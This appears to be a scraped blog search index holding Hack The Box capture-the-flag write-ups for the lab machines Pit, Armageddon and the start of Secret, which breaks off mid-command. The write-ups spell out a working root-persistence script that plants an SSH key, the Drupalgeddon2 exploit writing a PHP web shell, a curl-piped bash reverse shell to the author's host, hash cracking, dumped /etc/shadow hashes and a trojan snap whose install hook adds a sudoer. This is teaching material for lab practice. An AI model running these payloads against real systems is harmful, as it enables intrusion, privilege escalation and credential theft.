https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath /home/michelle/.local/bin:/home/michelle/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin New path exported: /home/michelle/.local/bin:/home/michelle/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin\nWe have a suspicious PATH - we should probably hijack a service and put a reverse shell in /home/michelle/bin/ or something. But to do that we need to find services that are ran by root. ‘ps -aux’ isn’t helping us, and ‘pspy64’ gives nothing.\nLooking back at the snmpwalk output we found ‘/usr/bin/monitor’.\n[michelle@pit bin]$ cat /usr/bin/monitor #!/bin/bash\nfor script in /usr/local/monitoring/check*sh\ndo\n    /bin/bash $script\ndone\nAnalysing the script, it seems like it’s running any/all scripts named check*sh - meaning we can create a bash script to copy /root/root.txt to /dev/shm, steal /root/.ssh/id_rsa, or put our public key to /root/.ssh/authorized_keys. NOTE: Reverse shell is not working, probably because of firewall rules.\n\nCreate a new SSH key for root and do a simple shell script to exploit the server.\n\n[root:/git/htb/pit]# ssh-keygen -t rsa -b 4096 -f root-id_rsa (master✱) Generating public/private rsa key pair. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in root-id_rsa Your public key has been saved in root-id_rsa.pub The key fingerprint is: SHA256:yYc3O25wt5maNafCX1OsVVtqJ5wzGTMsEkuVjWxWzCI root@nidus The key’s randomart image is: +—[RSA 4096]—-+ | oo.B. | | .EoB.+ | | o+..= o| | . o . o O+| | S + X.=| | .o.o.. O | | +o.o+= | | .+++= . | | .++o | +—-[SHA256]—–+\n[root:/git/htb/pit]# chmod 400 root-id_rsa\n[michelle@pit shm]$ chmod +x check.sh [michelle@pit shm]$ cat check.sh #!/bin/bash mkdir /root/.ssh chmod 700 /root/.ssh echo “ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMd2s5HemYsiwVFi8sFkrwjmtd2M+k7R5h1ckjtbnjG1KDIdLUc11QzeTf/S9v5PgY/bx3999k5VhxOPc26ag5cHy4UWeWccZC9w1OJFGNl6pFfIZtMxYXwyZGEyNcbxFEDJpOofcPMhuS4QHgBeYc0JUwAPp3ArVx++VEmTBFhaUtvxorQlJ4EqQ266upc0BdOANoblTcKRiKw0AU1bxAsRPYCuiw5Npc2BK9uwmkRFynULzPI8ZTRmtUtGI7Wc4c+IvsBN8+D0hN1GbfCKlGJJVP/DJ0mUJZMEZbvJafwrbJGQnJuE50sYMpMkqn1Yjt4CouFchVt9+akFVEmL4rR1qFKdvyzYMxA2ZYME0Pq91FucEr4MUSjG1oy0HVzD6IVmrVZzPRHlbfkRTROh8gpL4E16uwtDEGI8CNcKzKcv2Pd36ksKuyVnA+cYyRIh8PyjW2+53NZYb/1ZMAvBrXISNOusZBD6oC1RTFceQiTmScLogzG9Ew3bQhwL3gwpR7Le8bskcuK6XNfGfTb3pkGQhv/vLtqL+iJdVxPmNc3QeagZvV86MRtAtsjNbS8uXhC0g7Yk/YlBglcnz2f5cW4UGQU0vMdMxiGT9EPXq/rOpdoaXmJzSLekBZ+WpQgg3P34pH9kkVJkou9tPeRaN6IE6KGgfm72vTr8gre7ibMQ==” &gt; /root/.ssh/authorized_keys chmod 600 /root/.ssh/authorized_keys [michelle@pit shm]$ cp check.sh /usr/local/monitoring/\nTo trigger the script simply run snmpwalk again and login with SSH.\n[root:/git/htb/pit]# ./snmpwalk.py -v 1 -c public 10.10.10.241 1.3.6.1.4.1 .. SNMPv2-SMI::enterprises.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = OctetString: /usr/bin/monitor .. SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.30 = OctetString: 0x6d6b6469723a2063616e6e6f7420637265617465206469726563746f727920e280982f726f6f742f2e737368e280993a2046696c6520657869737473 SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.31 = OctetString: chmod: changing permissions of ‘/root/.ssh’: Permission denied SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.32 = OctetString: chmod: changing permissions of ‘/root/.ssh/authorized_keys’: Permission denied\nIf we decode the hex-string we get ‘mkdir: cannot create directory /root/.ssh: File exists’. And the following lines tells us that the chmod also was unnecessary. The only line that did go through was the echo.\n[root:/git/htb/pit]# ssh root@pit.htb -i root-id_rsa (master✱) Web console: https://pit.htb:9090/\nLast login: Mon May 10 11:42:46 2021\n[root@pit ~]# cat root.txt\n  1e1d0c725f9a9615a33dc02abad8da46\n\n[root@pit ~]# cat /etc/shadow\n  root:$6$4ZnZ0Iv3NzFIZtKa$tA78wgAwaBBSg96ecMRPYIogQmANo/9pJhHmf06bCmbKukMDM9rdT2Mdc6UhwD1raDzXIrk.zjQ9lkJIoLShE.:18757:0:99999:7:::\n  michelle:$6$hBsV4t2c9NMnABDe$.4cAMWqwmYPobZdusViisVwuafxDBSptElF1pFyg8O0ypF8DKoiqzYU9EfBx8H/gnTUGPMxEoxoc35rZWZDYn.:18370:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nCockpit: https://github.com/agentejo/cockpit/tree/0.11.1\nInstall Cockpit on CentOS8 https://medium.com/@r.szulist/how-to-install-and-configure-cockpit-on-cenos8-3615d503092a\nSNMP Enum: https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp\nOID Repo: http://oid-info.com/get/1.3.6.1.4.1\nSeedDMS RCE: https://www.exploit-db.com/exploits/47022"
  },
  {
    "objectID": "posts/2021-03-30-htb-writeup-armageddon/2021-03-30-htb-writeup-armageddon.html",
    "href": "posts/2021-03-30-htb-writeup-armageddon/2021-03-30-htb-writeup-armageddon.html",
    "title": "Armageddon - Hack The Box",
    "section": "",
    "text": "██╗   ██╗███████╗███████╗██████╗\n   ██║   ██║██╔════╝██╔════╝██╔══██╗\n   ██║   ██║███████╗█████╗  ██████╔╝\n   ██║   ██║╚════██║██╔══╝  ██╔══██╗\n   ╚██████╔╝███████║███████╗██║  ██║\n    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n\n1. [root:/git/htb]# nmap -Pn -n -sCV 10.129.103.143                                                                (master✱)\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-03-29 14:51 CEST\nNmap scan report for 10.129.103.143\nHost is up (0.028s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey:\n|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)\n|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)\n|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)\n80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)\n|_http-generator: Drupal 7 (http://drupal.org)\n| http-robots.txt: 36 disallowed entries (15 shown)\n| /includes/ /misc/ /modules/ /profiles/ /scripts/\n| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt\n| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt\n|_/LICENSE.txt /MAINTAINERS.txt\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16\n|_http-title: Welcome to  Armageddon |  Armageddon\n\n\n2. As we see 'Drupal 7' from the nmap output, and the box name is 'armageddon' - this higly suggests that the\nexploit used here should be drupalgeddon. First things first, we need to find the drupal version.\n\n[root:/opt/shells/py]# droopescan\n  --- snip ---\n  [+] Possible version(s):\n      7.56\n\nDownload drupalgeddon2 from their github and execute to get a php shell.\n\n[root:/git/htb/armageddon]# ./drupalgeddon.rb 10.129.103.143                                                                                        (master✱)\n  [*] --==[::#Drupalggedon2::]==--\n  --------------------------------------------------------------------------------\n  [i] Target : http://10.129.103.143/\n  --------------------------------------------------------------------------------\n  [+] Found  : http://10.129.103.143/CHANGELOG.txt    (HTTP Response: 200)\n  [+] Drupal!: v7.56\n  --------------------------------------------------------------------------------\n  [*] Testing: Form   (user/password)\n  [+] Result : Form valid\n  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n  [*] Testing: Clean URLs\n  [!] Result : Clean URLs disabled (HTTP Response: 404)\n  [i] Isn't an issue for Drupal v7.x\n  --------------------------------------------------------------------------------\n  [*] Testing: Code Execution   (Method: name)\n  [i] Payload: echo KCZFEGTX\n  [+] Result : KCZFEGTX\n  [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!\n  --------------------------------------------------------------------------------\n  [*] Testing: Existing file   (http://10.129.103.143/shell.php)\n  [!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***\n  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n  [*] Testing: Writing To Web Root   (./)\n  [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php\n  [+] Result : &lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&1' ); }\n  [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!\n  --------------------------------------------------------------------------------\n  [i] Fake PHP shell:   curl 'http://10.129.103.143/shell.php' -d 'c=hostname'\n  armageddon.htb&gt;&gt; whoami\n  apache\n\nLook on the drupal default configuration to see if we can find any sensitive data.\narmageddon.htb&gt;&gt; cat sites/default/settings.php\n  --- snip ---\n  $databases = array (\n    'default' =&gt;\n    array (\n      'default' =&gt;\n      array (\n        'database' =&gt; 'drupal',\n        'username' =&gt; 'drupaluser',\n        'password' =&gt; 'CQHEy@9M*m23gBVj',\n        'host' =&gt; 'localhost',\n        'port' =&gt; '',\n        'driver' =&gt; 'mysql',\n        'prefix' =&gt; '',\n      ),\n    ),\n  );\n\nBecause we only have a semi-interactive shell we can't use mysqldump;\narmageddon.htb&gt;&gt; mysqldump drupal -u drupaluser -p\n  Enter password: mysqldump: Got error: 1045: \"Access denied for user 'drupaluser'@'localhost' (using password: NO)\" when trying to connect\n\nTrying to curl on high ports ex 4488, 4444 or 8080 results in nothing. However trying normal ports like 80 or 443 works.\nWith this in mind, we create a bash reverse payload and setup a python http.server to trigger the reverse shell.\n\n[root:/srv/pub-share]# echo \"bash -i &gt;& /dev/tcp/10.10.14.82/443 0&gt;&1\" &gt; rev.sh\n[root:/srv/pub-share]# chmod +x rev.sh\n[root:/srv/pub-share]# python3 -m http.server 80\n\narmageddon.htb&gt;&gt; curl http://10.10.14.82/rev.sh | bash\n\n[root:/opt/shells/py]# nc -lvnp 443\n  listening on [any] 443 ...\n  connect to [10.10.14.82] from (UNKNOWN) [10.129.104.71] 59264\n  bash: no job control in this shell\n  bash-4.2$ whoami\n    apache\n\n\n3. We now have a interactive shell and can access the mysql database, normally or dumping it.\n\nmysqldump output A LOT of data, so going for the normal way might be the play.\nbash-4.2$ mysqldump drupal -u drupaluser -p\n  --- snip ---\n  -- Dumping data for table `users`\n  --\n\n  LOCK TABLES `users` WRITE;\n  /*!40000 ALTER TABLE `users` DISABLE KEYS */;\n  INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),(1,'brucetherealadmin','$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt','admin@armageddon.eu','','','filtered_html',1606998756,1607077194,1607076276,1,'Europe/London','',0,'admin@armageddon.eu','a:1:{s:7:\\\"overlay\\\";i:1;}');\n  /*!40000 ALTER TABLE `users` ENABLE KEYS */;\n  UNLOCK TABLES;\n\n[root:/git/htb/armageddon]# echo \"$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt\" &gt; brucetherealadmin.hash\n[root:/git/htb/armageddon]# hashcat -a0 -m7900 brucetherealadmin.hash /usr/share/wordlists/rockyou.txt\n  --- snip ---\n  $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo\n\n  Session..........: hashcat\n  Status...........: Cracked\n  Hash.Name........: Drupal7\n\n\n[root:/git/htb/armageddon]# ssh brucetherealadmin@10.129.104.71                                                                                     (master✱)\n  brucetherealadmin@10.129.104.71's password: booboo\n  Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2\n  [brucetherealadmin@armageddon ~]$ cat user.txt\n    8f83a9bfe112d6b52680038b2db5eb51\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n\n   ██████╗  ██████╗  ██████╗ ████████╗\n   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝\n   ██████╔╝██║   ██║██║   ██║   ██║\n   ██╔══██╗██║   ██║██║   ██║   ██║\n   ██║  ██║╚██████╔╝╚██████╔╝   ██║\n   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝\n\n\n1. Upload linpeas.sh and run.\n\n[root:...esome-scripts-suite/linPEAS]# python3 -m http.server 80\n[brucetherealadmin@armageddon shm]$ curl http://10.10.14.82/linpeas.sh -o linpeas.sh\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  218k  100  218k    0     0  1202k      0 --:--:-- --:--:-- --:--:-- 1207k\n[brucetherealadmin@armageddon shm]$ chmod +x linpeas.sh\n[brucetherealadmin@armageddon shm]$ ./linpeas.sh\n  --- snip ---\n  [+] PATH\n  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath\n  /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin\n  --- snip ---\n  User brucetherealadmin may run the following commands on armageddon:\n      (root) NOPASSWD: /usr/bin/snap install *\n\nFrom Linpeas we find that we find some interesting paths, as well as we are allowed to install any snap packages.\nWe can probably use this to elevate our privileges by creating a custom snap package.\n\n\n2. Googling around about 'snap privesc' one ofthe first things that comes up are dirty_sock. Reading about it, it's only\nvulnerable against systems below version 2.37.1.\n\n[brucetherealadmin@armageddon ~]$ snap version\n  snapd   2.47.1-1.el7\n\nAnd as we see from version output, the victim runs version 2.47.1 and should not be vulnerable. Downloading and running\nthe script (dirty_sockv2.py) proves that. However since we have option to install, lets look through what the script does.\nAt the very top of the script we find something very interesting:\n\n  # The following global is a base64 encoded string representing an installable\n  # snap package. The snap itself is empty and has no functionality. It does,\n  # however, have a bash-script in the install hook that will create a new user.\n  # For full details, read the blog linked on the github page above.\n  TROJAN_SNAP = ('''\n  aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/\n  /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh\n  ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5\n  TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo\n  T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl\n  Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt\n  ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv\n  ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n\n  L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt\n  b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe\n  rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj\n  rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA\n  AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2\n  XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5\n  RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA\n  AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''\n                 + 'A' * 4256 + '==')\n\nLets create our own 'TROJAN_SNAP' by using this code.\n\n[brucetherealadmin@armageddon ~]$ python2 -c \"print 'aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw' + 'A'*4256 + '=='\" | base64 -d &gt; TROJAN_SNAP.snap\n\n[brucetherealadmin@armageddon ~]$ cat TROJAN_SNAP.snap\n  hsqs!V\\�������������&gt;x#!/bin/bash\n\n  useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash\n  usermod -aG sudo dirty_sock\n  echo \"dirty_sock    ALL=(ALL:ALL) ALL\" &gt;&gt; /etc/sudoers\n  name: dirty-sock\n  version: '0.1'\n  summary: Empty snap, used for exploit\n  author: \"0xPThree\"\ndescription: 'See https://github.com/initstring/dirty_sock\n\n    '\n  architectures:\n  - amd64\n  confinement: devmode\n  grade: devel\n  �YZ��7zXZi\"�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�qj|��$l5K�(�y����#�Jq_ͼӡ�h�D��u������e�?U�V���þ�Xx�h#�?&gt;0\n  �YZ8��&lt;\\���&gt;��[\n\nbrucetherealadmin@armageddon ~]$ sudo snap install TROJAN_SNAP.snap\n  error: cannot find signatures with metadata for snap \"TROJAN_SNAP.snap\"\n\nWe encounter an error when installing because the confinement-flag 'devmode' is missing.\n\n[brucetherealadmin@armageddon ~]$ sudo snap install --devmode TROJAN_SNAP.snap\n  dirty-sock 0.1 installed\n\n\n3. Login with your new user, dirty_sock, and escalate to root by using 'sudo -i' and grab root.txt\n\n[brucetherealadmin@armageddon ~]$ su dirty_sock\n  Pa ssword:\n[dirty_sock@armageddon brucetherealadmin]$ whoami\n  dirty_sock\n[dirty_sock@armageddon brucetherealadmin]$ cat /root/root.txt\n  cat: /root/root.txt: Permission denied\n[dirty_sock@armageddon brucetherealadmin]$ sudo -i\n\n  We trust you have received the usual lecture from the local System\n  Administrator. It usually boils down to these three things:\n\n      #1) Respect the privacy of others.\n      #2) Think before you type.\n      #3) With great power comes great responsibility.\n\n  [sudo] password for dirty_sock:\n[root@armageddon ~]# cat /root/root.txt\n  2553971efae28d5233668a09ef81951b\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n\n   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗\n   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║\n   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║\n   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║\n   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║\n   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝\n\n\n drupalgeddon2:\n   https://github.com/dreadlocked/Drupalgeddon2\n\nDirty_sock:\n  https://github.com/initstring/dirty_sock\n  https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py\n\nSnap Installation Guide:\n  https://snapcraft.io/docs/installing-snap-on-debian\n  https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy"
  },
  {
    "objectID": "posts/2021-11-22-htb-writeup-secret/2021-11-22-htb-writeup-secret.html",
    "href": "posts/2021-11-22-htb-writeup-secret/2021-11-22-htb-writeup-secret.html",
    "title": "Secret - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n\nUSER\n\nStep 1\nnmap:\n┌──(void㉿void)-[/htb/secret]\n└─$ nmap -Pn -n -sCV 10.10.11.120  \nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 12:36 CET\nNmap scan report for 10.10.11.120\nHost is up (0.032s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)\n|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)\n|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)\n80/tcp   open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: DUMB Docs\n3000/tcp open  http    Node.js (Express middleware)\n|_http-title: DUMB Docs\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\ndirb:\n---- Scanning URL: http://10.10.11.120/ ----\n+ http://10.10.11.120/api (CODE:200|SIZE:93)\n+ http://10.10.11.120/assets (CODE:301|SIZE:179)\n+ http://10.10.11.120/docs (CODE:200|SIZE:20720)\n+ http://10.10.11.120/download (CODE:301|SIZE:183)\nnikto:\n+ Server: nginx/1.18.0 (Ubuntu)\nffuf:\n$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.120/api/FUZZ -fw 12\n[... snip ...]\nLogs                    [Status: 401, Size: 13, Words: 2, Lines: 1]\nlogs                    [Status: 401, Size: 13, Words: 2, Lines: 1]\npriv                    [Status: 401, Size: 13, Words: 2, Lines: 1]\n\nDownload Source Code from the webpage.\n\nFollow the instructions to the API and create a new user:\nPOST /api/user/register  HTTP/1.1\nHost: 10.10.11.120:3000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/json\nContent-Length: 96\n\n  {\n    \"name\": \"player3\",\n    \"email\": \"player3@dasith.works\",\n    \"password\": \"Kekc8swFgD6zU\"\n  }\nLogin to create a JWT:\nPOST /api/user/login  HTTP/1.1\nHost: 10.10.11.120:3000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/json\nContent-Length: 75\n\n  {\n    \"email\": \"player3@dasith.works\",\n    \"password\": \"Kekc8swFgD6zU\"\n  }\nHTTP/1.1 200 OK\nX-Powered-By: Express\nauth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoicGxheWVyMyIsImVtYWlsIjoicGxheWVyM0BkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY3MTg4NzN9.7GR5f0mFU9yXkS0u_KNXYhFYZ3mMoogphUYPjRiVm3w\nContent-Type: text/html; charset=utf-8\nContent-Length: 213\nETag: W/\"d5-fVNaUbvOpMzM3NzFy09qa9PwBE8\"\nDate: Fri, 12 Nov 2021 12:07:53 GMT\nConnection: close\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoicGxheWVyMyIsImVtYWlsIjoicGxheWVyM0BkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY3MTg4NzN9.7GR5f0mFU9yXkS0u_KNXYhFYZ3mMoogphUYPjRiVm3w\nLogin to verify the account:\n┌──(void㉿void)-[/htb/secret]\n└─$ curl -X GET http://10.10.11.120:3000/api/priv -H \"Content-Type: application/json\" -H \"Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoicGxheWVyMyIsImVtYWlsIjoicGxheWVyM0BkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY3MTg4NzN9.7GR5f0mFU9yXkS0u_KNXYhFYZ3mMoogphUYPjRiVm3w\"\n{\"role\":{\"role\":\"you are normal user\",\"desc\":\"player3\"}}\n\n\n\nStep 2\nLooking in .git history we find a token removed “because of security reasons”.\n┌──(void㉿void)-[/htb/secret/files/local-web/.git]\n└─$ git show 67d8da7 \ncommit 